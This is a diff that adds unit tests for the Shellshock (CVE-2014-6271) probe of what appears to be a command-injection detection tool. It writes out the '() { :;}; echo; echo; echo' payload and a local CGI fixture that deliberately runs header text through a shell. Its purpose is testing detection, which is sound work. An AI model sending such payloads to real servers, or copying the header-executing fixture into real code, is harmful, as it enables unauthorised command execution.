@@ -2033,6 +2033,205 @@ class DetectionMethodTestCase(unittest.TestCase):
         self.assertIn("Unknown --methods", result.stdout)
 
 
+class ShellshockProbeTestCase(unittest.TestCase):
+    """The Shellshock shape inside `reflected` (CVE-2014-6271).
+
+    Every other shape in that method breaks *out* of a command the application
+    is assembling. This one is never part of a command: a CGI server copies the
+    header into the environment and a vulnerable bash runs the text after the
+    function definition while it starts up. So the value has to *begin* with
+    `() {` -- which is what these tests pin, because a separator or a quote in
+    front of it turns the one shape that reaches this sink into a wasted
+    request."""
+
+    PREFIX = "() { :;}; "
+
+    def setUp(self):
+        self.gen = RCEKit()
+
+    def _shapes(self, context="raw", environment="unix", config=None):
+        import random as _random
+        meth = ReflectedMath(self.gen, config)
+        rec = make_record(environment=environment, context=context)
+        return [p for p in meth.build_probes(rec, _random.Random(5))
+                if p.carrier == "shellshock"]
+
+    def test_the_shape_begins_with_the_function_definition(self):
+        probes = self._shapes()
+        self.assertEqual(len(probes), 1, "one request per carrier, not one per separator")
+        probe = probes[0]
+        self.assertTrue(probe.payload.startswith(self.PREFIX), probe.payload)
+        self.assertIsNone(probe.separator)
+        # The two blank lines close the CGI header block; without them the
+        # server reads the computed value as a malformed header and discards it.
+        self.assertIn("; echo; echo; echo ", probe.payload)
+        # The confirmation invariant, unchanged: the sum is absent from the
+        # payload and the un-executed literal is present.
+        self.assertNotIn(probe.expected, probe.payload)
+        self.assertIn(probe.forbidden, probe.payload)
+
+    def test_no_separator_is_prepended(self):
+        # `_wrap_variants` builds one body per candidate separator and every
+        # other shape here goes through it. This one must not: `; () { :;}` is
+        # no longer a function definition and reaches nothing. Asserted against
+        # the dialect's whole separator table rather than against `;` alone,
+        # and against the bare core, so a prefix of any kind fails it.
+        payload = self._shapes()[0].payload
+        for separator in ReflectedMath.DEFAULT_SEPARATORS["unix"]:
+            self.assertFalse(payload.startswith(separator.strip() or separator),
+                             (separator, payload))
+        self.assertEqual(payload.index("() { :;};"), 0, payload)
+
+    def test_it_is_sent_at_quick_depth_as_well_as_full(self):
+        # One request, and the only shape that reaches a Shellshock sink --
+        # which is not the saving `--probe-depth quick` exists for.
+        for depth in ("quick", "full"):
+            self.assertEqual(len(self._shapes(config={"probe_depth": depth})), 1, depth)
+
+    def test_only_a_context_that_prepends_nothing_carries_it(self):
+        # Carried: the contexts that hand the value to the sink as its own
+        # first bytes. `xml` and `json` escape the body but prepend nothing,
+        # and the parser in between undoes the escaping.
+        for context in ("raw", "html", "unix_shell", "json", "xml"):
+            self.assertEqual(len(self._shapes(context=context)), 1, context)
+        # Refused, and the first two are the near neighbours: `attribute`
+        # opens with a quote and `attribute_unquoted` with a single space --
+        # one character, invisible in a diff, and enough that bash no longer
+        # reads a function definition.
+        for context in ("attribute", "attribute_unquoted", "shell_single_quoted",
+                        "shell_double_quoted", "shell_subshell", "shell_backtick",
+                        "xml_cdata", "javascript", "sql", "php", "yaml"):
+            self.assertEqual(self._shapes(context=context), [], context)
+
+    def test_the_cmd_and_powershell_dialects_do_not_get_it(self):
+        # bash parses the environment; cmd.exe and PowerShell do not, so the
+        # shape would be a request that cannot confirm.
+        for environment, context in (("windows", "windows_cmd"),
+                                     ("windows", "powershell")):
+            self.assertEqual(self._shapes(context=context, environment=environment),
+                             [], context)
+
+    def test_a_declared_filter_drops_it_through_the_same_gate(self):
+        # `--deny-chars` describes a filter the tester already measured. The
+        # shape carries braces and parentheses by construction, so a target
+        # that strips them cannot be reached and the request is not sent.
+        import random as _random
+        meth = ReflectedMath(self.gen, {"deny_chars": "{"})
+        rec = make_record(environment="unix", context="raw")
+        kept, reasons = meth.filter_probes(meth.build_probes(rec, _random.Random(5)))
+        self.assertEqual([p for p in kept if p.carrier == "shellshock"], [])
+        self.assertTrue(any("'{'" in reason for reason in reasons), reasons)
+
+    def test_a_declared_sink_shape_suppresses_it(self):
+        # The ladder's contract, and the first version of this shape broke all
+        # four of its tests: `--sink-raw`, `--sink-shape` and `--separators`
+        # each say the value lands inside a command the application built, so
+        # a shape that is never in a command could only come back negative.
+        # Same reasoning that drops the `raw` rung when separators are named.
+        for config in ({"sink_raw": True},
+                       {"sink_shapes": ("sep", "chain")},
+                       {"sink_shapes": ("raw",)},
+                       {"separators": ["| "]}):
+            self.assertEqual(self._shapes(config=config), [], config)
+
+    def test_an_explicit_context_does_not_suppress_it(self):
+        # The near neighbour, and the one that would make the gate useless:
+        # `--contexts raw` says where in the *serialization* the value sits,
+        # not that it lands inside a command. An operator who suspects a CGI
+        # narrows exactly this way, so reading it here would silence the shape
+        # for the run most likely to want it.
+        for config in ({"contexts_explicit": True},
+                       {"probe_depth": "quick", "contexts_explicit": True},
+                       {"evade": "none"},
+                       {"sink_env": "unix"}):
+            self.assertEqual(len(self._shapes(config=config)), 1, config)
+
+    def test_the_gate_reads_the_same_three_statements_as_the_printed_plan(self):
+        # One source of truth. `effective_sink_shapes` narrows on exactly these
+        # three for the pre-flight plan; if the two ever disagree, the plan
+        # describes traffic that is not the traffic.
+        for config in ({"sink_raw": True}, {"sink_shapes": ("sep",)},
+                       {"separators": ["| "]}):
+            method = ReflectedMath(self.gen, config)
+            self.assertTrue(method._sink_shape_declared(), config)
+            self.assertNotEqual(rcekit.effective_sink_shapes(config),
+                                rcekit.SINK_SHAPE_RUNGS, config)
+        self.assertFalse(ReflectedMath(self.gen, {})._sink_shape_declared())
+        self.assertEqual(rcekit.effective_sink_shapes({}), rcekit.SINK_SHAPE_RUNGS)
+
+    def _cgi_route(self, executes):
+        """A CGI endpoint behind a bash that parses its own environment.
+
+        `executes` is the /vuln vs /reflect switch. The vulnerable half models
+        what a vulnerable bash does and what the server does with the result:
+        the text after the function definition runs *before* the script writes
+        a byte, so its output arrives where the response headers belong, and
+        an output with no blank line in it is a malformed header block."""
+        def route(method, path, params, headers, body):
+            agent = headers.get("User-Agent", "")
+            script = "<html>status ok</html>"
+            if not executes:
+                # /reflect: the header is echoed and never run.
+                return 200, "User-Agent: " + agent + script
+            if not agent.startswith("() {"):
+                return 200, script
+            trailing = agent.split("}", 1)[1].lstrip("; ")
+            pipe = sh_popen(trailing + " 2>&1")
+            out = pipe.read()
+            pipe.close()
+            _headers, blank, rendered = out.partition(chr(10) + chr(10))
+            if not blank:
+                return 500, "malformed header from script"
+            return 200, rendered + script
+        return route
+
+    def test_the_fixture_discards_a_proof_that_closes_no_header_block(self):
+        # Guard the fixture before trusting the test below it. A payload
+        # without `echo; echo;` must come back 500 with the value gone, or the
+        # end-to-end test would pass for a shape missing the one part of it
+        # that is not obvious.
+        import urllib.error
+        import urllib.request
+        with local_target(self._cgi_route(True)) as base:
+            for core, expected_status, carried in (
+                    ("() { :;}; echo RKMARKER", 500, False),
+                    ("() { :;}; echo; echo; echo RKMARKER", 200, True)):
+                req = urllib.request.Request(base + "/cgi-bin/x",
+                                             headers={"User-Agent": core})
+                try:
+                    body = urllib.request.urlopen(req, timeout=10).read().decode()
+                    status = 200
+                except urllib.error.HTTPError as exc:
+                    body, status = exc.read().decode(), exc.code
+                self.assertEqual(status, expected_status, core)
+                self.assertEqual("RKMARKER" in body, carried, core)
+
+    def test_it_confirms_through_a_header_and_never_on_the_reflecting_half(self):
+        rec = make_record(environment="unix", context="raw")
+        with local_target(self._cgi_route(True)) as base:
+            vuln = self.gen.run_detection(
+                [rec], url=base + "/cgi-bin/status", methods=["reflected"],
+                headers=["User-Agent: FUZZ"], timeout=10,
+                config={"probe_depth": "quick"})
+        confirmed = [r for r in vuln if r["verdict"] == "executed"]
+        self.assertTrue(confirmed, "the Shellshock shape must confirm on a vulnerable CGI")
+        self.assertTrue(all(r["tier"] == "executed" for r in confirmed))
+        # Only the Shellshock shape can reach this sink: the application never
+        # puts the header into a command, so a separator-led probe has nothing
+        # to break out of. If another shape confirmed, the fixture would be
+        # modelling plain command injection and this test would prove nothing.
+        self.assertTrue(all(p.startswith("() {") for p in
+                            (r.get("payload", "") for r in confirmed)), confirmed)
+
+        with local_target(self._cgi_route(False)) as base:
+            reflect = self.gen.run_detection(
+                [rec], url=base + "/cgi-bin/status", methods=["reflected"],
+                headers=["User-Agent: FUZZ"], timeout=10,
+                config={"probe_depth": "quick"})
+        self.assertFalse([r for r in reflect if r["verdict"] == "executed"],
+                         "a target that only echoes the header must never confirm")
+
+
 class RawRequestInputTestCase(unittest.TestCase):
     """Phase 2 — the `-r` raw HTTP request input layer. Each injection point is
     marked with FUZZ and routed into the existing verify/detect engine, which
